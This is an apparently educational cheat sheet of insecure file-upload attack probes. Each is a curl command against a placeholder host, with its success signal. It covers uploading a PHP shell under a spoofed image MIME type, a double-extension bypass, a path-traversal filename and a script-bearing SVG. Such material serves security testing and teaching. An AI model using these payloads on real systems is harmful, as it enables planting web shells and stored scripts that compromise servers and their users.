# Insecure File Uploads - Annotated Examples

## MIME Confusion Upload
```bash
curl -s -X POST https://target.com/api/upload \
  -F "file=@shell.php;type=image/jpeg"
```
Exploit signal:
```
upload accepted and stored under web-accessible path
```

## Double Extension Bypass
```bash
curl -s -X POST https://target.com/api/upload \
  -F "file=@payload.php.jpg"
```
Exploit signal:
```
server strips trailing extension or executes as script
```

## Filename Traversal Probe
```bash
curl -s -X POST https://target.com/api/upload \
  -F "file=@avatar.png;filename=../../../tmp/poc.txt"
```
Exploit signal:
```
file appears outside intended upload directory
```

## SVG Script Injection
```bash
curl -s -X POST https://target.com/api/upload \
  -F "file=@payload.svg;type=image/svg+xml"
```
Where `payload.svg` contains script content.
Exploit signal:
```
script executes when uploaded file URL is opened
```
